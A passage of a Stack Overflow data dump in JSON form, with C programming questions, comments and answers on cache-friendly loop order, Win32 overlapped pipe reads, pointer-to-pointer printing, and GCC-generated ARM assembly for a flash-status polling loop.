"https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1449702149, "post_id": 34189896, "comment_id": 56127707, "body": "The rule of thumb is, your inner-most loop shall make the most of localized data and avoid strided access. When you do need strided access, make sure to avoid cache conflict so that cached data can be used by the next iteration instead of being evicted."}, {"owner": {"user_type": "does_not_exist", "display_name": "user5411184"}, "reply_to_user": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1449703743, "post_id": 34189896, "comment_id": 56128345, "body": "@user3528438 OK, makes perfect sense now, thank you a ton! Also, when you increase block size, does this increase the misses because there are less blocks in the cache which could cause conflict misses?"}, {"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1449705341, "post_id": 34189896, "comment_id": 56128958, "body": "It doesn&#39;t matter how many cache lines of data is cached. If you are preparing for an exam, the key word related to this problem is cache associativity."}, {"owner": {"user_type": "does_not_exist", "display_name": "user5411184"}, "reply_to_user": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 1, "creation_date": 1449706573, "post_id": 34189896, "comment_id": 56129396, "body": "@user3528438 I understand, however the practice problem states &quot;assume associativity and cache size is constant&quot;, I guess I forgot to include that in the post."}], "answers": [{"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user4842163"}, "is_accepted": false, "score": 3, "last_activity_date": 1450261467, "last_edit_date": 1450261467, "creation_date": 1450257173, "answer_id": 34307929, "question_id": 34189896, "link": "https://stackoverflow.com/questions/34189896/cache-performance-concerning-loops-in-c/34307929#34307929", "title": "Cache Performance (concerning loops) in C", "body": "<p>Just generally speaking, the most efficient loops through a matrix are going to cycle through the last dimension, not the first (\"last\" being <code>c</code> in <code>m[a][b][c]</code>).</p>\n\n<p>For example, given a 2D matrix like an image which has its pixels represented in memory from top-left to bottom-right, the quickest way to sequentially iterate through it is going to be horizontally across each scanline, like so:</p>\n\n<pre><code>for (int y=0; y &lt; h; ++y) {\n    for (int x=0; x &lt; w; ++x)\n        // access pixel[y][x]\n}\n</code></pre>\n\n<p>... not like this:</p>\n\n<pre><code>for (int x=0; x &lt; w; ++x) {\n    for (int y=0; y &lt; h; ++y)\n        // access pixel[y][x]\n}\n</code></pre>\n\n<p>... due to spatial locality. It's because the computer grabs memory from slower, bigger regions of the hierarchy and moves it to faster, small regions in large, aligned chunks (ex: 64 byte cache lines, 4 kilobyte pages, and down to a little teeny 64-bit general-purpose register, e.g.). The first example accesses all the data from such a contiguous chunk immediately and prior to eviction.</p>\n\n<p><code>harold</code> on this site gave me a nice view on how to look at and explain this subject by suggesting not to focus so much on cache misses, but instead focusing on striving to use all the data in a cache prior to eviction. The second example fails to do that for all but the most trivially-small images by iterating through the image vertically with a large, scanline-sized stride rather than horizontally with a small, pixel-sized one.</p>\n\n<p><strong><em>Also, when we increase block size, but keep cache size and associativity constant, does it influence the miss rate? At a certain point increasing block size can cause a higher miss rate, right?</em></strong></p>\n\n<p>The answer here would be \"yes\", as an increase in block size would naturally equate to more compulsory misses (that would be more simply \"misses\" though rather than \"miss rate\") but also just more data to process which won't all necessarily fit into the fastest L1 cache. If we're accessing a large amount of data with a large stride, we end up getting a higher non-compulsory miss rate as a result of more data being evicted from the cache before we utilize it, only to then redundantly load it back into a faster cache.</p>\n\n<p>There is also a case where, if the block size is small enough and aligned properly, all the data will just fit into a single cache line and it wouldn't matter so much how we sequentially access it.</p>\n\n<h2>Matrix Multiplication</h2>\n\n<p>Now your example is quite a bit more complex than this straightforward image example above, but the same concepts tend to apply.</p>\n\n<p>Let's look at the first one:</p>\n\n<pre><code>for (i = 0; i &lt; n; i++) {\n    for (j = 0; j &lt; n; j++) {\n        accum = 0.0;\n        for (k = 0; k &lt; n; k++)\n            accum += b[j][k] * a[k][i];\n        c[j][i] = accum;\n    }\n}\n</code></pre>\n\n<p>If we look at the innermost <code>k</code> loop, we access <code>b[j][k]</code>. That's a fairly optimal access pattern: \"horizontal\" if we imagine a row-order memory layout. However, we also access <code>a[k][i]</code>. That's not so optimal, especially for a very large matrix, as it's accessing memory in a vertical pattern with a large stride and will tend to suffer from data being evicted from the fastest but smallest forms of memory before it is used, only to load that chunk of data again redundantly.</p>\n\n<p>If we look at the second <code>j</code> loop, that's accessing <code>c[j][i]</code>, again in a vertical fashion which is not so optimal.</p>\n\n<p>Now let's have a glance at the second example:</p>\n\n<pre><code>for (j = 0; j &lt; n; j++) {\n    for (k = 0; k &lt; n; k++) {\n        val = b[j][k];\n        for (i = 0; i &lt; n; i++)\n            c[j][i] += val * a[k][i];\n    }\n}\n</code></pre>\n\n<p>If we look at the second <code>k</code> loop in this case, it's starting off accessing <code>b[j][k]</code> which is optimal (horizontal). Furthermore, it's explicitly memoizing the value to <code>val</code>, which might improve the odds of the compiler moving that to a register and keeping it there for the following loop (this relates to compiler concepts related to aliasing, however, rather than CPU cache).</p>\n\n<p>In the innermost <code>i</code> loop, we're accessing <code>c[j][i]</code> which is also optimal (horizontal) along with <code>a[k][i]</code> which is also optimal (horizontal).</p>\n\n<p>So this second version is likely to be more efficient in practice. Note that we can't absolutely say that, as aggressive optimizing compilers can do all sorts of magical things like rearranging and unrolling loops for you. Yet short of that, we should be able to say the second one has higher odds of being more efficient.</p>\n\n<h2>\"What's a profiler?\"</h2>\n\n<p>I just noticed this question in the comments. A profiler is a measuring tool that can give you a precise breakdown of where time is spent in your code, along with possibly further statistics like cache misses and branch mispredictions.</p>\n\n<p>It's not only good for optimizing real-world production code and helping you more effectively prioritize your efforts to places that really matter, but it can also accelerate the learning process of understanding why inefficiencies exist through the process of chasing one hotspot after another.</p>\n\n<h2>Loop Tiling/Blocking</h2>\n\n<p>It's worth mentioning an advanced optimization technique which can be useful for large matrices -- loop tiling/blocking. It's beyond the scope of this subject but that one plays to temporal locality.</p>\n\n<h2>Deep C Optimization</h2>\n\n<p>Hopefully later you will be able to C these things clearly as a deep C explorer. While most optimization is best saved for hindsight with a profiler in hand, it's useful to know the basics of how the memory hierarchy works as you go deeper and deeper exploring the C.</p>\n\n<p><a href=\"https://i.stack.imgur.com/l9rSA.jpg\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/l9rSA.jpg\" alt=\"enter image description here\"></a></p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user5411184"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 874, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1450280191, "creation_date": 1449698844, "last_edit_date": 1450280191, "question_id": 34189896, "link": "https://stackoverflow.com/questions/34189896/cache-performance-concerning-loops-in-c", "title": "Cache Performance (concerning loops) in C", "body": "<p>I was wondering, why does one set of loops allow for better cache performance than another in spite of logically doing the same thing?</p>\n\n<ol>\n<li><pre><code>for (i = 0; i &lt; n; i++) {\n    for (j = 0; j &lt; n; j++) {\n        accum = 0.0;\n        for (k = 0; k &lt; n; k++) {\n            accum += b[j][k] * a[k][i];\n        }\n        c[j][i] = accum;\n    }\n}\n</code></pre></li>\n<li><pre><code>for (j = 0; j &lt; n; j++) {\n    for (k = 0; k &lt; n; k++) {\n        val = b[j][k];\n        for (i = 0; i &lt; n; i++) {\n            c[j][i] += val * a[k][i];\n        }\n    }\n}\n</code></pre></li>\n</ol>\n\n<p>I believe the first one above delivers better cache performance, but why?</p>\n\n<p>Also, when we increase block size, but keep cache size and associativity constant, does it influence the miss rate? At a certain point increasing block size can cause a higher miss rate, right?</p>\n"}, {"tags": ["c", "multithreading", "winapi", "asynchronous", "pipe"], "comments": [{"owner": {"reputation": 50953, "user_id": 1983495, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/aMDiK.jpg?s=128&g=1", "display_name": "Iharob Al Asimi", "link": "https://stackoverflow.com/users/1983495/iharob-al-asimi"}, "edited": false, "score": 3, "creation_date": 1449698830, "post_id": 34189839, "comment_id": 56126157, "body": "Excelent way to ask a question. I wish there were more questions like this. Sadly I have no Idea of the API you&#39;re using, but I upvoted the question hoping it gets more attention."}, {"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 1, "creation_date": 1449698898, "post_id": 34189839, "comment_id": 56126201, "body": "Where do you process the asynchronous result from the ReadFile call that returned ERROR_IO_PENDING? ERROR_IO_PENDING isn&#39;t a failure, it means the data will be delivered asynchronously."}, {"owner": {"reputation": 46142, "user_id": 773113, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/FKKLW.jpg?s=128&g=1", "display_name": "Mike Nakis", "link": "https://stackoverflow.com/users/773113/mike-nakis"}, "edited": false, "score": 0, "creation_date": 1449699180, "post_id": 34189839, "comment_id": 56126347, "body": "Please show how you create the pipe.  (So that, among other things, we can see whether it is in message mode or in stream mode.)"}, {"owner": {"reputation": 46142, "user_id": 773113, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/FKKLW.jpg?s=128&g=1", "display_name": "Mike Nakis", "link": "https://stackoverflow.com/users/773113/mike-nakis"}, "reply_to_user": {"reputation": 50953, "user_id": 1983495, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/aMDiK.jpg?s=128&g=1", "display_name": "Iharob Al Asimi", "link": "https://stackoverflow.com/users/1983495/iharob-al-asimi"}, "edited": false, "score": 1, "creation_date": 1449699204, "post_id": 34189839, "comment_id": 56126362, "body": "@iharob it is regular plain ol&#39; Win32."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1449699862, "post_id": 34189839, "comment_id": 56126686, "body": "I have replaced [windows] with the more specific [winapi], as this question seems specific to Windows API behavior."}, {"owner": {"reputation": 33827, "user_id": 506413, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1a474f3be606bcc6f964913b523626e9?s=128&d=identicon&r=PG", "display_name": "Jonathan Potter", "link": "https://stackoverflow.com/users/506413/jonathan-potter"}, "edited": false, "score": 0, "creation_date": 1449700627, "post_id": 34189839, "comment_id": 56127053, "body": "When you say &quot;ReadFile() sets ERROR_IO_PENDING&quot;, is it actually returning FALSE? It&#39;s a common mistake to call <code>GetLastError()</code> when a function hasn&#39;t actually failed, and you&#39;ve stripped out all your error checking code so we can&#39;t tell."}, {"owner": {"reputation": 33265, "user_id": 886887, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/1616c7e4fab23f6e014ee11d75408bba?s=128&d=identicon&r=PG", "display_name": "Harry Johnston", "link": "https://stackoverflow.com/users/886887/harry-johnston"}, "edited": false, "score": 3, "creation_date": 1449708579, "post_id": 34189839, "comment_id": 56130030, "body": "Hard to say without seeing more of the code, but it looks like you&#39;re doing it back to front, i.e., waiting for an event and then issuing the read request, as if you were using select().  Windows asynchronous I/O works the other way around, i.e., you issue the read request, then wait for the event saying it completed."}, {"owner": {"reputation": 9011, "user_id": 124038, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/271d88c4888422ccac04b597511e9c19?s=128&d=identicon&r=PG", "display_name": "Calvin1602", "link": "https://stackoverflow.com/users/124038/calvin1602"}, "reply_to_user": {"reputation": 33265, "user_id": 886887, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/1616c7e4fab23f6e014ee11d75408bba?s=128&d=identicon&r=PG", "display_name": "Harry Johnston", "link": "https://stackoverflow.com/users/886887/harry-johnston"}, "edited": false, "score": 0, "creation_date": 1449735258, "post_id": 34189839, "comment_id": 56138965, "body": "@HarryJohnston Please put your comment as an answer. Upvotes will ensue =) Thanks !!!!"}, {"owner": {"reputation": 33265, "user_id": 886887, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/1616c7e4fab23f6e014ee11d75408bba?s=128&d=identicon&r=PG", "display_name": "Harry Johnston", "link": "https://stackoverflow.com/users/886887/harry-johnston"}, "edited": false, "score": 0, "creation_date": 1449777829, "post_id": 34189839, "comment_id": 56165523, "body": "I think that&#39;s a true duplicate - the ReadFile loop looks very much the same as yours - but if the community disagrees with me then I&#39;ll post an answer here as well, though it will look very much like the existing one. :-)"}], "owner": {"reputation": 9011, "user_id": 124038, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/271d88c4888422ccac04b597511e9c19?s=128&d=identicon&r=PG", "display_name": "Calvin1602", "link": "https://stackoverflow.com/users/124038/calvin1602"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 60, "favorite_count": 2, "closed_date": 1449778300, "answer_count": 0, "score": 5, "last_activity_date": 1449735870, "creation_date": 1449698606, "last_edit_date": 1449735870, "question_id": 34189839, "link": "https://stackoverflow.com/questions/34189839/reading-asynchronous-pipe-loosing-data", "closed_reason": "Duplicate", "title": "Reading asynchronous pipe - loosing data", "body": "<p>I want to read data from a pipe. The reads must not block the main thread (so everything is in a separate thread), and it must be cancellable (so I use overlapped IO with <code>FILE_FLAG_OVERLAPPED</code> flag)</p>\n\n<p>This following code is simplified, but I only removed error checking : </p>\n\n<pre><code>pipe = CreateNamedPipe(\"\\\\\\\\.\\\\pipe\\\\pipename\", PIPE_ACCESS_INBOUND | FILE_FLAG_OVERLAPPED , 0, 1, 1024, 1024, 1000, NULL);\n\nwhile (1) {\n  // wait for either new data, or cancellation\n  DWORD wait = WaitForMultipleObjects(2,events,FALSE,INFINITE);\n\n  // Assume \"new data event\" and no error\n\n  GetOverlappedResult(pipe,&amp;overlap,&amp;unused,FALSE); // always succeeds\n  ReadFile(pipe,outputbuffer,neededsize,outputsize, &amp;overlap); // sometimes says ERROR_IO_PENDING via GetLastError()\n}\n</code></pre>\n\n<ul>\n<li>The first buffers are received correctly.</li>\n<li>No data is sent for a few seconds</li>\n<li>This seems to signal the event. No data is read (<em>none was sent</em>!), and <code>ReadFile()</code> sets <code>ERROR_IO_PENDING</code>.</li>\n<li>Another set of data is sent</li>\n<li><code>ReadFile</code> looses some of the new data.</li>\n</ul>\n\n<p>To be be precise, the last <code>ReadFile()</code> looses as much data as I requested in the <em>previous</em> <code>ReadFile()</code>.</p>\n\n<p>What do I do wrong?</p>\n\n<p><a href=\"https://msdn.microsoft.com/fr-fr/library/windows/desktop/aa365603(v=vs.85).aspx\" rel=\"nofollow\">Obligatory reference</a></p>\n\n<p>EDIT - Correct way, again without error checking :</p>\n\n<pre><code>BOOL res = ReadFile(...as before...);\nif(res)\n    return; //success, reading was instantaneous, there was already data.\n//GetLastError() is supposed to be ERROR_IO_PENDING here\nwait = WaitForMultipleObjects(2,events,FALSE,INFINITE);\n// Assume \"new data event\" and no error\nres = GetOverlappedResult(pipe, &amp;overlap, &amp;cbRet, FALSE);\n// Now the buffer you gave to ReadFile has its cbRet first bytes filled.\n</code></pre>\n"}, {"tags": ["c", "pointers", "arr"], "comments": [{"owner": {"reputation": 25, "user_id": 5645239, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EnbZD.png?s=128&g=1", "display_name": "Vahid Ef", "link": "https://stackoverflow.com/users/5645239/vahid-ef"}, "edited": false, "score": 0, "creation_date": 1449697705, "post_id": 34189622, "comment_id": 56125590, "body": "sorry,in line 3 of question second q is p not q,miss typed"}, {"owner": {"reputation": 533, "user_id": 5613000, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d21885cdf3eab3a31152c12315051c78?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan Fitzpatrick", "link": "https://stackoverflow.com/users/5613000/ryan-fitzpatrick"}, "edited": false, "score": 1, "creation_date": 1449697828, "post_id": 34189622, "comment_id": 56125655, "body": "it should be int ** q, &amp;p is the address of an int pointer, to get your last print to print 3, do **q"}, {"owner": {"reputation": 828, "user_id": 3058060, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/raWu5.png?s=128&g=1", "display_name": "ViniciusArruda", "link": "https://stackoverflow.com/users/3058060/viniciusarruda"}, "reply_to_user": {"reputation": 533, "user_id": 5613000, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d21885cdf3eab3a31152c12315051c78?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan Fitzpatrick", "link": "https://stackoverflow.com/users/5613000/ryan-fitzpatrick"}, "edited": false, "score": 0, "creation_date": 1449698108, "post_id": 34189622, "comment_id": 56125803, "body": "If you do like @RyanFitzpatrick sugested, <code>q</code> is equivalent to <code>&amp;p</code>, <code>*q</code> is equivalent to <code>&amp;a</code>. <code>**q</code> is equivalent to <code>a</code> which stores <code>3</code>."}, {"owner": {"reputation": 25, "user_id": 5645239, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EnbZD.png?s=128&g=1", "display_name": "Vahid Ef", "link": "https://stackoverflow.com/users/5645239/vahid-ef"}, "edited": false, "score": 0, "creation_date": 1449698382, "post_id": 34189622, "comment_id": 56125933, "body": "**q not working,i&#39;ve tried"}, {"owner": {"reputation": 533, "user_id": 5613000, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d21885cdf3eab3a31152c12315051c78?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan Fitzpatrick", "link": "https://stackoverflow.com/users/5613000/ryan-fitzpatrick"}, "edited": false, "score": 0, "creation_date": 1449698850, "post_id": 34189622, "comment_id": 56126176, "body": "@VahidEf q must be of type int** see my answer for a working version of your code"}], "answers": [{"tags": [], "owner": {"reputation": 814, "user_id": 5608223, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/040d9c81fc7a722b9f93cc492ab3a728?s=128&d=identicon&r=PG&f=1", "display_name": "N. Leavy", "link": "https://stackoverflow.com/users/5608223/n-leavy"}, "is_accepted": false, "score": 1, "last_activity_date": 1449697841, "creation_date": 1449697841, "answer_id": 34189678, "question_id": 34189622, "link": "https://stackoverflow.com/questions/34189622/array-and-pointer-chain/34189678#34189678", "title": "array and pointer chain", "body": "<p>The difference is in <code>printf()</code>. The <code>%s</code> expects a pointer to a null terminated string, while <code>%i</code> expects to be handed the number itself, not a pointer to the number, which is what you have.</p>\n"}, {"tags": [], "owner": {"reputation": 106086, "user_id": 15809, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/2ULwK.jpg?s=128&g=1", "display_name": "Mecki", "link": "https://stackoverflow.com/users/15809/mecki"}, "is_accepted": true, "score": 1, "last_activity_date": 1449699427, "last_edit_date": 1449699427, "creation_date": 1449698037, "answer_id": 34189721, "question_id": 34189622, "link": "https://stackoverflow.com/questions/34189622/array-and-pointer-chain/34189721#34189721", "title": "array and pointer chain", "body": "<p><code>a</code> is an <code>int</code>, so <code>p</code> is a pointer to an <code>int</code> (<code>int *</code>), thus <code>q</code> is a pointer to a pointer to an <code>int</code> (<code>int **</code>). To print an <code>int</code>, you feed that <code>int</code> to <code>printf</code>:</p>\n\n<pre><code>printf(\"This is an int: %i\\n\", 42);\n</code></pre>\n\n<p>So for <code>%i</code> the function <code>printf</code> expects an argument of type <code>int</code>, but you pass <code>*q</code> to it, which is of type <code>int *</code>. You pass a pointer to <code>printf</code>, which does not expect a pointer for numbers, only for strings.</p>\n"}, {"tags": [], "owner": {"reputation": 533, "user_id": 5613000, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d21885cdf3eab3a31152c12315051c78?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan Fitzpatrick", "link": "https://stackoverflow.com/users/5613000/ryan-fitzpatrick"}, "is_accepted": false, "score": 0, "last_activity_date": 1449699063, "last_edit_date": 1449699063, "creation_date": 1449698723, "answer_id": 34189870, "question_id": 34189622, "link": "https://stackoverflow.com/questions/34189622/array-and-pointer-chain/34189870#34189870", "title": "array and pointer chain", "body": "<p>This is what the working code should look like    </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(void) {\n    char *names[]={\"jack\",\"philip\"};\n    printf(\"%s\\n\",*names);\n    int a=3;\n    int *p=&amp;a;\n    int **q=&amp;p;\n    printf(\"%i\\n\",**q);\n    return 0;\n}\n</code></pre>\n\n<p>%s expects a char* which as you correctly stated is what *names is, since names is of type char**. However %i expects an int. Since p points to a, p is an int pointer, since q points to p q is a pointer to an int pointer. <em>q is just whatever p is pointing at (the address of a) so it won't print what you want. also assigning type int</em> to the address of an int* (which is what youre doing when you do int* q = &amp;p) will have unexpected results</p>\n\n<pre><code>printf(\"%i\", *q);\n</code></pre>\n\n<p>would be like doing</p>\n\n<pre><code>printf(\"%c\", *names);\n</code></pre>\n\n<p>which obviously will give strange output</p>\n"}], "owner": {"reputation": 25, "user_id": 5645239, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EnbZD.png?s=128&g=1", "display_name": "Vahid Ef", "link": "https://stackoverflow.com/users/5645239/vahid-ef"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 437, "favorite_count": 0, "accepted_answer_id": 34189721, "answer_count": 3, "score": 1, "last_activity_date": 1449699427, "creation_date": 1449697625, "question_id": 34189622, "link": "https://stackoverflow.com/questions/34189622/array-and-pointer-chain", "title": "array and pointer chain", "body": "<p>As written in c books,an array name is a pointer to first element so here in names array,names points to first element which is also a pointer to string literal,then *names will print the first element,but in next line of code p points to a,and q points to q like names arr,but as u print *q u dont get a value which is 3,why?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint main(void){\n    char *names[]={\"jack\",\"philip\"};\n    printf(\"%s\\n\",*names);\n    int a=3;\n    int *p=&amp;a;\n    int *q=&amp;p;\n    printf(\"%i\\n\",*q);\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "gcc", "assembly", "arm"], "comments": [{"owner": {"reputation": 71860, "user_id": 366377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/863018588657c38d29f22e72dc81325e?s=128&d=identicon&r=PG", "display_name": "Jens Gustedt", "link": "https://stackoverflow.com/users/366377/jens-gustedt"}, "edited": false, "score": 2, "creation_date": 1449697781, "post_id": 34189516, "comment_id": 56125628, "body": "Don&#39;t disassemble your code, just use <code>-S</code> to produce the assembler directly. If you are lucky it may even be a bit more comprehensive."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1449698096, "post_id": 34189516, "comment_id": 56125797, "body": "I think you&#39;re missing a <code>*</code> somewhere. Otherwise, your code is just <code>while(1)</code>."}, {"owner": {"reputation": 1068, "user_id": 492520, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/2ddf2ce3e4bb2499b3759ed779c48813?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/492520/dmitri"}, "reply_to_user": {"reputation": 71860, "user_id": 366377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/863018588657c38d29f22e72dc81325e?s=128&d=identicon&r=PG", "display_name": "Jens Gustedt", "link": "https://stackoverflow.com/users/366377/jens-gustedt"}, "edited": false, "score": 0, "creation_date": 1449698546, "post_id": 34189516, "comment_id": 56125995, "body": "@JensGustedt Thanks for the tip. Tried it, but the compile-time assembly listing says the same exact thing. So does reading back the memory directly through the IDE&#39;s built-in disassembler. :/"}, {"owner": {"reputation": 1068, "user_id": 492520, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/2ddf2ce3e4bb2499b3759ed779c48813?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/492520/dmitri"}, "reply_to_user": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1449698644, "post_id": 34189516, "comment_id": 56126062, "body": "@user3386109 Does look like an infinite loop. And yet it seems to run as intended in the C code (this is a write-flash function and the flash does get written without getting stuck in an infinite loop waiting for the write-finished flag). :O"}, {"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 0, "creation_date": 1449698801, "post_id": 34189516, "comment_id": 56126141, "body": "I am missing the C code,"}, {"owner": {"reputation": 1068, "user_id": 492520, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/2ddf2ce3e4bb2499b3759ed779c48813?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/492520/dmitri"}, "edited": false, "score": 0, "creation_date": 1449698830, "post_id": 34189516, "comment_id": 56126158, "body": "the C code is &quot;while(!(FTFE_FSTAT &amp; FTFE_FSTAT_CCIF_MASK)) {}&quot;. That is all."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 3, "creation_date": 1449698911, "post_id": 34189516, "comment_id": 56126211, "body": "Either that&#39;s not the actual <code>while</code> statement, or those aren&#39;t the actual <code>#define</code>s."}, {"owner": {"reputation": 1068, "user_id": 492520, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/2ddf2ce3e4bb2499b3759ed779c48813?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/492520/dmitri"}, "edited": false, "score": 0, "creation_date": 1449699091, "post_id": 34189516, "comment_id": 56126294, "body": "sorry. those are not actual defines. edited to clarify. the mask is an actual define, but FTFE_FSTAT is a control register and goes through a bunch of macros to get to a pointer dereference (as is customary in MCUs). so 14: and 18: are loading the address of that register into r3 and the ldr is dereferencing it and loading its contants into r3. that part is straightforward and working as expected. what is happening after that I have no clue."}, {"owner": {"reputation": 18029, "user_id": 3156750, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/73e00c291e7b746a34f28622a64f0492?s=128&d=identicon&r=PG&f=1", "display_name": "Notlikethat", "link": "https://stackoverflow.com/users/3156750/notlikethat"}, "edited": false, "score": 1, "creation_date": 1449699247, "post_id": 34189516, "comment_id": 56126384, "body": "What are the <i>types</i> of the things involved? Are there any other expressions hidden in these unknown macros? It&#39;s very hard to reason about code generation without having the same information that the compiler had at the time..."}, {"owner": {"reputation": 35113, "user_id": 3826372, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/P0peM.png?s=128&g=1", "display_name": "Ross Ridge", "link": "https://stackoverflow.com/users/3826372/ross-ridge"}, "edited": false, "score": 1, "creation_date": 1449699612, "post_id": 34189516, "comment_id": 56126559, "body": "The behaviour you&#39;ve noticed is expected. Without optimization enabled GCC generates bad code that does a lot of unnecessary things. The assembly code is correct. It will loop so long as the the eight bit (counting from one) of the byte at 0x40020000 is not set."}, {"owner": {"reputation": 1068, "user_id": 492520, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/2ddf2ce3e4bb2499b3759ed779c48813?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/492520/dmitri"}, "reply_to_user": {"reputation": 35113, "user_id": 3826372, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/P0peM.png?s=128&g=1", "display_name": "Ross Ridge", "link": "https://stackoverflow.com/users/3826372/ross-ridge"}, "edited": false, "score": 0, "creation_date": 1449699846, "post_id": 34189516, "comment_id": 56126673, "body": "@RossRidge What indicates that it checks the 0x80 bit specifically? That&#39;s  the big thing I am not seeing here. As far as inefficiency, you are right that is to be expected, so it should not be surprising if some of those uxtb/sxtb don&#39;t actually do anything."}, {"owner": {"reputation": 35113, "user_id": 3826372, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/P0peM.png?s=128&g=1", "display_name": "Ross Ridge", "link": "https://stackoverflow.com/users/3826372/ross-ridge"}, "edited": false, "score": 0, "creation_date": 1449700084, "post_id": 34189516, "comment_id": 56126786, "body": "The sign extension does something. It&#39;s the zero extensions that are unnecessary as their effect is undone by the sign extension."}, {"owner": {"reputation": 1068, "user_id": 492520, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/2ddf2ce3e4bb2499b3759ed779c48813?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/492520/dmitri"}, "reply_to_user": {"reputation": 35113, "user_id": 3826372, "user_type": 